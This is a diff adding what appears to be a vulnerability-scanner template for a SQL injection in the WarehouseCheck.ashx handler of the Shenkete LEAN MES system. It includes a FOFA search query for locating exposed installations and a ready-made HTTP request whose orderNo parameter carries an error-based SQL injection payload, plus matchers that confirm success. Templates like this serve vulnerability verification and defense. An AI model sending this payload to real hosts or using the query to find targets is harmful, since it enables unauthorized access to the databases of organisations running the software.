@@ -1,0 +1,28 @@
+## id: VEID-2026-11123
+## name: 深科特LEAN MES系统 WarehouseCheck.ashx SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 深科特LEAN MES系统 WarehouseCheck.ashx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 深科特LEAN MES系统
+## fofa-query: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+## verification: true
+
+
+
+GET /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28104%29%2BCHAR%28101%29%2BCHAR%28108%29%2BCHAR%28108%29%2BCHAR%28111%29%2BCHAR%2832%29%2BCHAR%28118%29%2BCHAR%28101%29%2BCHAR%28105%29%2BCHAR%28108%29%29%29--+keHv&itemCode=1 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: body contains "'hello veil'" && body contains "转换成数据类型 int 时失败"
+#@ matcher: status_code == 500
+
+
+
+
+
+
+
+# @VEIL-STAMP: df5f9c3b88bbf4c82489d98f55413167d04b7f115df26681af40c75e95fd446c
